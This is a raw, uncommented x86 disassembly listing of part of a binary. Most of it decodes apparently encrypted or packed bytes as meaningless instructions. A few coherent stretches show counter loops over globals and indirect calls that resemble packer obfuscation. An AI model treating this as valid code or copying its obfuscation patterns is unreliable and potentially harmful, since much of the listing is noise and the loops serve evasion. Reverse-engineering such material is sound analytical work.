  409c9e:	mov    bh,0xf5
  409ca0:	jae    0x409c6c
  409ca2:	out    dx,al
  409ca3:	jae    0x409c76
  409ca5:	not    DWORD PTR [esi]
  409ca7:	ins    DWORD PTR es:[edi],dx
  409ca8:	xlat   BYTE PTR ds:[ebx]
  409ca9:	(bad)  [edx]
  409cab:	xor    al,0x27
  409cad:	and    ebx,DWORD PTR [ebx-0x1dc82be7]
  409cb3:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  409cb5:	(bad)  
  409cb6:	not    BYTE PTR [edx]
  409cb8:	js     0x409c98
  409cba:	dec    edx
  409cbb:	and    bh,dl
  409cbd:	sub    DWORD PTR [eax+0x39b95c17],esi
  409cc3:	xor    al,0x42
  409cc5:	daa    
  409cc6:	xchg   ebx,eax
  409cc7:	sub    BYTE PTR [edx-0x3b49df86],0x44
  409cce:	test   DWORD PTR [ebp+0x4c],edi
  409cd1:	push   ss
  409cd2:	pop    ds
  409cd3:	cs aaa 
  409cd5:	pop    esi
  409cd6:	adc    BYTE PTR [esi],0x4a
  409cd9:	push   es
  409cda:	lods   eax,DWORD PTR ds:[esi]
  409cdb:	xchg   esi,eax
  409cdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cdd:	aas    
  409cde:	loopne 0x409c6e
  409ce0:	test   al,0x27
  409ce2:	sub    al,0x95
  409ce4:	push   edx
  409ce5:	sbb    BYTE PTR [di+0x4c],al
  409ce9:	sti    
  409cea:	pop    esi
  409ceb:	aaa    
  409cec:	xor    edx,DWORD PTR [edx-0x58]
  409cef:	inc    edi
  409cf0:	test   DWORD PTR [esi+ebp*1-0x32],ebx
  409cf4:	inc    ebp
  409cf5:	(bad)  
  409cf6:	imul   esi,DWORD PTR [edx],0x5767a38c
  409cfc:	sub    BYTE PTR [ebx-0x59],cl
  409cff:	pusha  
  409d00:	adc    ebx,DWORD PTR [edi]
  409d02:	cdq    
  409d03:	mov    ds:0xabda06bd,al
  409d08:	mov    cl,0xce
  409d0a:	dec    esi
  409d0b:	mov    ebp,0x42e32da7
  409d10:	dec    edi
  409d11:	(bad)  
  409d12:	pop    edi
  409d13:	into   
  409d14:	pop    esi
  409d15:	add    edi,DWORD PTR [eax]
  409d17:	dec    ebx
  409d18:	gs xchg ebp,eax
  409d1a:	adc    BYTE PTR [eax],ch
  409d1c:	in     eax,0xd0
  409d1e:	jo     0x409cee
  409d20:	xor    ch,BYTE PTR [eax]
  409d22:	mov    DWORD PTR [ebx-0x24],edx
  409d25:	(bad)  
  409d26:	mov    edx,0x3ad71bfa
  409d2b:	adc    al,0x46
  409d2d:	xchg   ebx,eax
  409d2e:	sti    
  409d2f:	fs jae 0x409cbb
  409d32:	shl    DWORD PTR [edi+edi*8-0x7350c69b],cl
  409d39:	push   cs
  409d3a:	ret    0x4e29
  409d3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d3e:	mov    ds:0x258d4445,al
  409d43:	call   0x6f89301c
  409d48:	retf   
  409d49:	stos   BYTE PTR es:[edi],al
  409d4a:	or     DWORD PTR [edx-0x66],edi
  409d4d:	sub    al,0x95
  409d4f:	test   BYTE PTR [eax-0x3835a465],ch
  409d55:	outs   dx,DWORD PTR ds:[esi]
  409d56:	and    al,0xf
  409d58:	fsubr  DWORD PTR [eax]
  409d5a:	dec    edi
  409d5b:	cmp    eax,0x462b351b
  409d60:	sbb    cl,ch
  409d62:	in     al,0x59
  409d64:	push   edi
  409d65:	les    edx,FWORD PTR [ebx+0x23892d6]
  409d6b:	sbb    al,BYTE PTR [eax-0x27]
  409d6e:	push   cs
  409d6f:	loope  0x409d4f
  409d71:	repz lea eax,gs:[ecx]
  409d75:	or     eax,0x83ac447a
  409d7a:	inc    esi
  409d7b:	jg     0x409dfb
  409d7d:	clc    
  409d7e:	mov    dl,0xa1
  409d80:	pop    ebp
  409d81:	test   ecx,ecx
  409d83:	mov    DWORD PTR ds:0x433617,0x34e7
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43360b
  409d9c:	sub    DWORD PTR ds:0x4336df,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x433653,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	lods   al,BYTE PTR ds:[esi]
  409dbf:	lds    esi,FWORD PTR [esi]
  409dc1:	ja     0x409dfb
  409dc3:	loop   0x409e43
  409dc5:	jle    0x409dff
  409dc7:	jl     0x409e47
  409dc9:	jle    0x409d5a
  409dcb:	ds xor eax,0x61ccf77
  409dd1:	xor    al,BYTE PTR [edi-0x48]
  409dd4:	in     al,dx
  409dd5:	repz inc edx
  409dd7:	call   0xd78:0x4ebf1eb
  409dde:	add    ebp,ebp
  409de0:	retf   
  409de1:	fsubr  DWORD PTR [edi+0x25]
  409de4:	fnstsw WORD PTR [edi-0x55523b6d]
  409dea:	sub    al,0xcd
  409dec:	dec    ebx
  409ded:	sub    al,0x1a
  409def:	inc    ecx
  409df0:	addr16 aaa 
  409df2:	pop    ss
  409df3:	popa   
  409df4:	sub    eax,0x7854938
  409df9:	fimul  WORD PTR [esi+ecx*2]
  409dfc:	out    0x0,eax
  409dfe:	pop    ds
  409dff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e00:	enter  0xe6ac,0x38
  409e04:	xchg   edi,eax
  409e05:	inc    esp
  409e06:	and    dh,BYTE PTR [ecx-0x50]
  409e09:	mov    dh,0x40
  409e0b:	sbb    ebp,0x30581164
  409e11:	fs into 
  409e13:	and    esp,esi
  409e15:	loopne 0x409d99
  409e17:	inc    eax
  409e18:	ja     0x409e20
  409e1a:	in     eax,dx
  409e1b:	fcmovnu st,st(4)
  409e1d:	loop   0x409e95
  409e1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e20:	dec    eax
  409e21:	arpl   bp,dx
  409e23:	ror    DWORD PTR [ebx+0x4a],cl
  409e26:	xchg   ecx,eax
  409e27:	pop    ebx
  409e28:	jae    0x409dd0
  409e2a:	dec    esp
  409e2b:	fdivr  QWORD PTR [ebx-0x2c]
  409e2e:	lahf   
  409e2f:	cld    
  409e30:	mov    ds:0xf606e3c9,al
  409e35:	gs out 0xac,eax
  409e38:	fdivp  st(2),st
  409e3a:	sbb    DWORD PTR [esi],esp
  409e3c:	mov    esi,0x4fdacf1c
  409e41:	add    eax,0x1d2360d3
  409e46:	cmp    DWORD PTR [esi+0x31],0x5d34ff13
  409e4d:	loop   0x409eb6
  409e4f:	ja     0x409dd2
  409e51:	cmp    al,0xbb
  409e53:	fs jp  0x409e9a
  409e56:	add    al,0xa
  409e58:	aad    0xdf
  409e5a:	pop    eax
  409e5b:	push   esp
  409e5c:	jecxz  0x409ebf
  409e5e:	test   DWORD PTR [ebp+0x1b],esi
  409e61:	sbb    al,0x1a
  409e63:	add    eax,0x9486e1e6
  409e68:	les    esi,FWORD PTR [ecx+0x67b6a949]
  409e6e:	mov    WORD PTR [edi+edx*2],?
  409e71:	cli    
  409e72:	push   eax
  409e73:	mov    bl,0x9d
  409e75:	jo     0x409e38
  409e77:	cmp    DWORD PTR [ecx-0x7d73c801],eax
  409e7d:	cmp    al,0xef
  409e7f:	mov    edx,0xe6a7c24b
  409e84:	aaa    
  409e85:	call   0xd20f:0xa35edeac
  409e8c:	sbb    eax,0xd02ee064
  409e91:	mov    al,0x18
  409e93:	mov    ecx,0xa6040e18
  409e98:	pop    edx
  409e99:	imul   esp,DWORD PTR [ecx+0x25c42adc],0xffffffbd
  409ea0:	mov    bl,0xfe
  409ea2:	push   esp
  409ea3:	pop    ss
  409ea4:	out    dx,al
  409ea5:	mov    ebx,0x47392447
  409eaa:	jno    0x409e96
  409eac:	or     DWORD PTR [esi-0x40],esi
  409eaf:	adc    ecx,DWORD PTR [edx-0x484fe6e8]
  409eb5:	cmc    
  409eb6:	jecxz  0x409f2e
  409eb8:	lds    ebp,FWORD PTR [eax+0x1d]
  409ebb:	jns    0x409f19
  409ebd:	test   BYTE PTR [esi-0x44],dh
  409ec0:	lds    ecx,FWORD PTR [esp+eiz*4-0x5f5477f1]
  409ec7:	cwde   
  409ec8:	jo     0x409e83
  409eca:	pop    esp
  409ecb:	ror    DWORD PTR [ebp+ecx*4-0x38db7e3b],cl
  409ed2:	mov    dh,0x72
  409ed4:	loop   0x409f0a
  409ed6:	outs   dx,DWORD PTR ds:[esi]
  409ed7:	aas    
  409ed8:	in     al,0xa4
  409eda:	stos   DWORD PTR es:[edi],eax
  409edb:	inc    ecx
  409edc:	jbe    0x409f34
  409ede:	std    
  409edf:	cwde   
  409ee0:	es xor al,0xff
  409ee3:	xchg   edi,eax
  409ee4:	out    dx,eax
  409ee5:	push   eax
  409ee6:	push   0x85d8d534
  409eeb:	sbb    ecx,DWORD PTR [esi+ebp*8-0x3723f97a]
  409ef2:	sbb    al,0x60
  409ef4:	xlat   BYTE PTR ds:[ebx]
  409ef5:	ret    0xe509
  409ef8:	call   0x263c328f
  409efd:	or     eax,0x2e135f1
  409f02:	xchg   edi,eax
  409f03:	add    al,0x4c
  409f05:	ss int 0x89
  409f08:	mov    ebx,0x1d1ec740
  409f0d:	inc    ecx
  409f0e:	adc    al,0xe6
  409f10:	cmp    DWORD PTR [eax-0x65565f89],0xc47202aa
  409f1a:	mov    ah,0x71
  409f1c:	jo     0x409f38
  409f1e:	mov    ebp,0xad082679
  409f23:	adc    edx,ecx
  409f25:	inc    esi
  409f26:	cmp    DWORD PTR [eax+edi*8],esp
  409f29:	jmp    0x71bbb872
  409f2e:	adc    al,0x29
  409f30:	or     ah,BYTE PTR [eax]
  409f32:	(bad)  
  409f33:	clc    
  409f34:	popa   
  409f35:	xchg   esi,eax
  409f36:	cld    
  409f37:	js     0x409f6f
  409f39:	jno    0x409ee9
  409f3b:	sbb    al,0xbd
  409f3d:	xchg   ecx,eax
  409f3e:	inc    eax
  409f3f:	mov    al,bh
  409f41:	mov    ch,0xf7
  409f43:	mov    ?,WORD PTR [ebp-0x3e]
  409f46:	xchg   BYTE PTR [ebx+ecx*4],bl
  409f49:	cld    
  409f4a:	jp     0x409f7b
  409f4c:	jle    0x409ee3
  409f4e:	(bad)  
  409f50:	lds    esp,FWORD PTR [ebx]
  409f52:	pop    edx
  409f53:	scas   eax,DWORD PTR es:[edi]
  409f54:	jp     0x409f33
  409f56:	mov    ecx,0x3cd46209
  409f5b:	cwde   
  409f5c:	shr    BYTE PTR [ebp+0x28],cl
  409f5f:	(bad)  
  409f60:	in     al,dx
  409f61:	pop    ebx
  409f62:	sbb    bh,BYTE PTR [edx+0x26]
  409f65:	inc    esi
  409f66:	jne    0x409f7e
  409f68:	sti    
  409f69:	and    BYTE PTR [eax+0x74],bl
  409f6c:	aaa    
  409f6d:	sar    DWORD PTR [ebx-0x25],1
  409f70:	cmp    ecx,esi
  409f72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f73:	jmp    0x7fed:0xcef1b59e
  409f7a:	sub    bh,BYTE PTR [edi]
  409f7c:	ret    
  409f7d:	mov    eax,0xd8796e3e
  409f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f83:	mov    edx,edx
  409f85:	cld    
  409f86:	adc    BYTE PTR [ecx],0x6e
  409f89:	pop    esp
  409f8a:	es retf 
  409f8c:	xor    eax,0x1275e128
  409f91:	push   eax
  409f92:	arpl   dx,si
  409f94:	fsub   DWORD PTR [ebx]
  409f96:	call   0x4a2c:0x6a73f5c4
  409f9d:	shr    dl,cl
  409f9f:	mov    DWORD PTR [eax+0x5ebc1ee5],edx
  409fa5:	mov    ecx,DWORD PTR [ebp+edx*2-0x2f]
  409fa9:	leave  
  409faa:	fcmovnb st,st(5)
  409fac:	int    0xfb
  409fae:	sub    eax,0x82bdf0d6
  409fb3:	retf   0xd394
  409fb6:	push   es
  409fb7:	pop    esp
  409fb8:	mov    eax,cs
  409fba:	popa   
  409fbb:	jne    0x40a004
  409fbd:	ja     0x409f8a
  409fbf:	mov    eax,ds:0xa40431b8
  409fc4:	and    eax,ebp
  409fc6:	pushf  
  409fc7:	clc    
  409fc8:	add    bl,BYTE PTR [ebx-0x3bcbb9aa]
  409fce:	xchg   ebx,eax
  409fcf:	sub    BYTE PTR [eax],al
  409fd1:	inc    eax
  409fd2:	push   ecx
  409fd3:	test   BYTE PTR [edi+ecx*8],0xfa
  409fd7:	add    al,0xd3
  409fd9:	xor    eax,eax
  409fdb:	pusha  
  409fdc:	mov    ds:0xba880371,al
  409fe1:	shr    DWORD PTR [eax],cl
  409fe3:	scas   al,BYTE PTR es:[edi]
  409fe4:	dec    esi
  409fe5:	fst    DWORD PTR [ecx+0x59d5f6fa]
  409feb:	or     edi,DWORD PTR ds:0x638664a4
  409ff1:	sub    cl,BYTE PTR [ebp+0x497c7bb4]
  409ff7:	push   esp
  409ff8:	cwde   
  409ff9:	lock rcr DWORD PTR [ebx],cl
  409ffc:	inc    edi
  409ffd:	inc    eax
  409ffe:	xchg   edx,eax
  409fff:	push   eax
  40a000:	adc    ch,BYTE PTR [edi+0x16]
  40a003:	mov    dh,0x28
  40a005:	mov    BYTE PTR [ebx-0x64],dh
  40a008:	popf   
  40a009:	jle    0x409fe8
  40a00b:	iret   
  40a00c:	and    eax,0xf0acfba
  40a011:	scas   eax,DWORD PTR es:[edi]
  40a012:	sar    BYTE PTR [ecx+0x4573],1
  40a018:	mov    edi,DWORD PTR ds:0x4336d3
  40a01e:	sbb    DWORD PTR ds:0x43360f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x433663,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x433623
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x43365b,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x43365b
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x43365b,ecx
  40a059:	cmp    DWORD PTR ds:0x43365b,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x43383e
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x43365b,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43360b,0x11
  40a090:	cmp    DWORD PTR ds:0x43360b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43360b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43360b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43360b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43360b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43360b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43360b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433603,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x43366f
  40a0f9:	sub    ecx,DWORD PTR ds:0x433613
  40a0ff:	mov    DWORD PTR ds:0x43366f,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x433667,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	mov    ah,0xc4
  40a128:	enter  0x8234,0xe0
  40a12c:	jle    0x40a1ac
  40a12e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a132:	or     eax,0xeb88890
  40a137:	add    ah,dl
  40a139:	pusha  
  40a13a:	idiv   ebx
  40a13c:	scas   eax,DWORD PTR es:[edi]
  40a13d:	fidiv  WORD PTR ds:0x566d70ea
  40a143:	ret    0x741c
  40a146:	xor    al,0x44
  40a148:	inc    ebp
  40a149:	pop    ebx
  40a14a:	pop    ss
  40a14b:	das    
  40a14c:	sub    ebp,esi
  40a14e:	and    eax,0xb768b119
  40a153:	or     BYTE PTR [edi-0x28ebd1e5],ch
  40a159:	cmp    eax,0xd82bebf3
  40a15e:	pop    esi
  40a15f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a160:	mov    bl,0xf0
  40a162:	pop    ecx
  40a163:	push   0xffffffb2
  40a165:	outs   dx,DWORD PTR ds:[esi]
  40a166:	test   BYTE PTR [ecx-0x240b62fb],0x36
  40a16d:	cmp    DWORD PTR [eax+ebx*4],edx
  40a170:	jno    0x40a17e
  40a172:	(bad)  
  40a173:	or     al,0x80
  40a175:	cmp    al,0x95
  40a177:	popa   
  40a178:	mul    BYTE PTR [esi+0x7850f828]
  40a17e:	(bad)  
  40a17f:	out    dx,al
  40a180:	mov    esp,0xfb519bb7
  40a185:	inc    ebx
  40a186:	dec    ebx
  40a187:	add    eax,0x6682732f
  40a18c:	gs dec esp
  40a18e:	fldcw  WORD PTR [eax]
  40a190:	pop    eax
  40a191:	ins    BYTE PTR es:[edi],dx
  40a192:	mov    dh,0xd5
  40a194:	clc    
  40a195:	outs   dx,DWORD PTR ds:[esi]
  40a196:	loopne 0x40a1c5
  40a198:	int    0xfb
  40a19a:	or     eax,0xb73e61e0
  40a19f:	sbb    eax,0x3b20d2d
  40a1a4:	or     edi,DWORD PTR [ebx+0x14]
  40a1a7:	adc    DWORD PTR [edi-0x67],ebx
  40a1aa:	shr    DWORD PTR [edx],cl
  40a1ac:	and    eax,0x70d23dc3
  40a1b1:	scas   al,BYTE PTR es:[edi]
  40a1b2:	inc    esi
  40a1b3:	xchg   esp,eax
  40a1b4:	div    DWORD PTR [ebx-0x2d]
  40a1b7:	aas    
  40a1b8:	ficom  DWORD PTR [edx]
  40a1ba:	xchg   ecx,eax
  40a1bb:	cwde   
  40a1bc:	(bad)  
  40a1bd:	aas    
  40a1be:	or     eax,0xc49dba95
  40a1c3:	(bad)  
  40a1c4:	in     eax,dx
  40a1c5:	sub    eax,0x12adaf95
  40a1ca:	and    edi,DWORD PTR [ecx]
  40a1cc:	out    0x94,eax
  40a1ce:	sbb    ah,al
  40a1d0:	add    BYTE PTR [ecx],bl
  40a1d2:	inc    edi
  40a1d3:	dec    ebx
  40a1d4:	cmp    ecx,0xfffffff5
  40a1d7:	nop
  40a1d8:	imul   ebx,DWORD PTR [edx],0xfffffffb
  40a1db:	and    al,0x58
  40a1dd:	cvtpi2ps xmm3,QWORD PTR [edi+edi*1]
  40a1e1:	push   es
  40a1e2:	inc    ebx
  40a1e3:	ret    
  40a1e4:	data16 jl 0x40a203
  40a1e7:	into   
  40a1e8:	(bad)  
  40a1e9:	daa    
  40a1ea:	or     ecx,edi
  40a1ec:	sbb    esi,DWORD PTR [ebx-0x2986e1f7]
  40a1f2:	loop   0x40a23b
  40a1f4:	std    
  40a1f5:	jle    0x40a1af
  40a1f7:	sar    BYTE PTR [ecx-0x4d993bc1],1
  40a1fd:	lahf   
  40a1fe:	xchg   BYTE PTR [esi*4-0x56305cac],bl
  40a205:	fstp   QWORD PTR ds:0xb652b7c4
  40a20b:	test   dl,bh
  40a20d:	hlt    
  40a20e:	adc    DWORD PTR [ebx+edi*1-0x7faa3d2c],ecx
  40a215:	pop    ds
  40a216:	out    0x85,al
  40a218:	pop    ds
  40a219:	and    BYTE PTR [edi-0x784c31d5],ah
  40a21f:	push   DWORD PTR [ebx+0x5b23bf0]
  40a225:	lds    esi,FWORD PTR [ecx]
  40a227:	outs   dx,DWORD PTR ds:[esi]
  40a228:	test   eax,0xbe1b270a
  40a22d:	icebp  
  40a22e:	sbb    ebx,ecx
  40a230:	test   al,0xfc
  40a232:	pop    esi
  40a233:	loopne 0x40a2b4
  40a235:	aaa    
  40a236:	mov    ah,0x76
  40a238:	ins    BYTE PTR es:[edi],dx
  40a239:	fsub   DWORD PTR [eax]
  40a23b:	mov    es,edx
  40a23d:	pop    eax
  40a23e:	push   ebx
  40a23f:	pop    esp
  40a240:	sbb    ch,BYTE PTR [ebp+0x52c35b27]
  40a246:	rcl    DWORD PTR [edi+0x19],0x8d
  40a24a:	imul   edi,DWORD PTR [edx],0x3a54cf86
  40a250:	push   cs
  40a251:	test   DWORD PTR [ebx+0x3d],ecx
  40a254:	fcom   DWORD PTR [esi+0xc]
  40a257:	sbb    dh,BYTE PTR [esi+0xa]
  40a25a:	test   eax,0xcf0e6cb4
  40a25f:	push   esi
  40a260:	clc    
  40a261:	ins    BYTE PTR es:[edi],dx
  40a262:	cld    
  40a263:	add    bh,BYTE PTR [eax]
  40a265:	mov    cl,0x62
  40a267:	data16 ins BYTE PTR es:[edi],dx
  40a269:	loope  0x40a2e0
  40a26b:	pop    esp
  40a26c:	pop    esp
  40a26d:	mov    ah,0xcd
  40a26f:	xor    al,0xba
  40a271:	and    al,0x72
  40a273:	lock rcl DWORD PTR [edi],cl
  40a276:	mov    ebx,0xa29c1b59
  40a27b:	imul   DWORD PTR [esi+eiz*8]
  40a27e:	das    
  40a27f:	xchg   esp,eax
  40a280:	mov    esp,0xc39273d0
  40a285:	dec    eax
  40a286:	push   cs
  40a287:	or     BYTE PTR es:[esi-0x6a],dh
  40a28b:	dec    ebx
  40a28c:	daa    
  40a28d:	push   edx
  40a28e:	push   ebp
  40a28f:	jns    0x40a29a
  40a291:	in     eax,dx
  40a292:	das    
  40a293:	xchg   esi,eax
  40a294:	mov    eax,ds:0xa9f8b28c
  40a299:	push   cs
  40a29a:	and    edi,esp
  40a29c:	inc    ecx
  40a29d:	inc    edi
  40a29e:	popf   
  40a29f:	repz xor eax,0xa0f49685
  40a2a5:	loop   0x40a2a1
  40a2a7:	cli    
  40a2a8:	pop    ebp
  40a2a9:	les    eax,FWORD PTR [ebp-0x3bb73963]
  40a2af:	jae    0x40a2e4
  40a2b1:	or     al,0x82
  40a2b3:	enter  0x407c,0x21
  40a2b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2b8:	repnz in eax,dx
  40a2ba:	nop
  40a2bb:	cwde   
  40a2bc:	jne    0x40a2c4
  40a2be:	pop    eax
  40a2bf:	mov    dl,0x3e
  40a2c1:	jne    0x40a2a8
  40a2c3:	call   0x23bdd857
  40a2c8:	cmc    
  40a2c9:	stos   BYTE PTR es:[edi],al
  40a2ca:	ss push 0x5afde7ec
  40a2d0:	xchg   BYTE PTR [edi],bl
  40a2d2:	jo     0x40a2fd
  40a2d4:	cmp    eax,0xc93dda4a
  40a2d9:	mov    al,bl
  40a2db:	jne    0x40a353
  40a2dd:	cmp    esi,DWORD PTR [ebp+0xa]
  40a2e0:	and    al,0x7a
  40a2e2:	mov    ebp,DWORD PTR ds:0xc703ae6a
  40a2e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2e9:	xchg   BYTE PTR [ebx-0x26],dh
  40a2ec:	push   ebp
  40a2ed:	pop    ebp
  40a2ee:	add    ecx,ebp
  40a2f0:	push   ds
  40a2f1:	mov    ch,0x81
  40a2f3:	fild   QWORD PTR [edi]
  40a2f5:	std    
  40a2f6:	out    0x22,eax
  40a2f8:	shl    DWORD PTR [ebp+0x713b556b],cl
  40a2fe:	fisubr WORD PTR [edx-0x20]
  40a301:	enter  0x4d9a,0xf8
  40a305:	not    edi
  40a307:	ins    BYTE PTR es:[edi],dx
  40a308:	cmp    DWORD PTR [esi],eax
  40a30a:	fadd   QWORD PTR [esi+ebp*8-0x1f983eff]
  40a311:	or     eax,0xef85cd46
  40a316:	cmp    esi,DWORD PTR [ebp-0xc]
  40a319:	inc    DWORD PTR ds:0x45d3d557
  40a31f:	icebp  
  40a320:	mov    eax,ds:0x7ca32b30
  40a325:	sub    eax,0x4886a7e5
  40a32a:	enter  0x271b,0xd8
  40a32e:	mov    esp,0xe42d99fb
  40a333:	les    edx,FWORD PTR [ecx+0x17]
  40a336:	inc    ebp
  40a337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a338:	xor    ah,BYTE PTR [ebx+eiz*8-0x2a]
  40a33c:	jl     0x40a3af
  40a33e:	int    0x76
  40a340:	jecxz  0x40a2d4
  40a342:	or     dl,BYTE PTR [eax]
  40a344:	jo     0x40a313
  40a346:	inc    ecx
  40a347:	mov    ?,WORD PTR ds:0x45682d92
  40a34d:	jnp    0x40a31a
  40a34f:	loopne 0x40a368
  40a351:	sbb    al,0xa7
  40a353:	call   0x5bfd:0x5fa7d9e7
  40a35a:	pop    bp
  40a35c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a35d:	or     ah,bl
  40a35f:	add    ebp,eax
  40a361:	pop    ebp
  40a362:	pop    ss
  40a363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a364:	ins    BYTE PTR es:[edi],dx
  40a365:	fdiv   QWORD PTR [edi-0x3532e143]
  40a36b:	sub    DWORD PTR [ecx+0x50406c04],ebp
  40a371:	dec    ebp
  40a372:	push   ds
  40a373:	xor    eax,0x3c0c2074
  40a378:	mov    ecx,DWORD PTR [ebp-0x18]
  40a37b:	xor    ecx,eax
  40a37d:	and    DWORD PTR ds:0x4335fb,0x0
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x4335fb
  40a394:	inc    eax
  40a395:	mov    ds:0x4335fb,eax
  40a39a:	cmp    DWORD PTR ds:0x4335fb,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x4335fb,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x4336ef
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x43366b
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x433667,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x433667,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x433667,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433697
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x433667,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x433667
  40a434:	dec    eax
  40a435:	mov    ds:0x433667,eax
  40a43a:	mov    eax,ds:0x433667
  40a43f:	dec    eax
  40a440:	mov    ds:0x433667,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43361f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x43372f
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x433723,0x4336a7
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433607,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	fst    QWORD PTR [ecx]
  40a49d:	jmp    0x40a4e9
  40a49f:	dec    esp
  40a4a0:	out    dx,al
  40a4a1:	jle    0x40a521
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	ins    BYTE PTR es:[edi],dx
  40a4a8:	fidiv  WORD PTR [eax+0x2cc58bad]
  40a4ae:	data16 std 
  40a4b0:	in     eax,0x32
  40a4b2:	(bad)  [ebp+0x1c]
  40a4b5:	xor    al,BYTE PTR [ecx-0xa632eed]
  40a4bb:	inc    eax
  40a4bc:	push   ebx
  40a4bd:	mov    BYTE PTR [ebx-0x569cef78],al
  40a4c3:	mov    edx,0xa0e9fb9d
  40a4c8:	popf   
  40a4c9:	(bad)  
  40a4ca:	lahf   
  40a4cb:	repnz icebp 
  40a4cd:	adc    esi,DWORD PTR [edx+0x26]
  40a4d0:	jle    0x40a452
  40a4d2:	imul   esi,edi,0x140bbf32
  40a4d8:	mov    ds:0xf559a467,al
  40a4dd:	outs   dx,DWORD PTR ds:[esi]
  40a4de:	cld    
  40a4df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4e0:	aad    0xf8
  40a4e2:	jnp    0x40a559
  40a4e4:	nop
  40a4e5:	(bad)  
  40a4e7:	int3   
